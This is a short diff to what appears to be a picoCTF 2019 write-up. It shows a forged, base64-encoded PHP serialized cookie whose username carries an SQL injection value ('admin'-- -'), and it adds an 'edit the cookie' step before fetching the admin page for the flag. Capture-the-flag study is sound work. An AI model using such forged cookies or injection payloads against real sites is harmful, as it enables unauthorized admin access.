@@ -19,7 +19,7 @@ O:11:"permissions":1:{s:8:"username";s:10:"admin'-- -";}
 TzoxMToicGVybWlzc2lvbnMiOjE6e3M6ODoidXNlcm5hbWUiO3M6MTA6ImFkbWluJy0tIC0iO30=
 ```
 
-Visit the admin page at https://2019shell1.picoctf.com/problem/32256/index.php?file=admin, we will get flag.
+Edit the cookie, then visit the admin page at https://2019shell1.picoctf.com/problem/32256/index.php?file=admin, we will get flag.
 
 ![flag.png](flag.png)
 
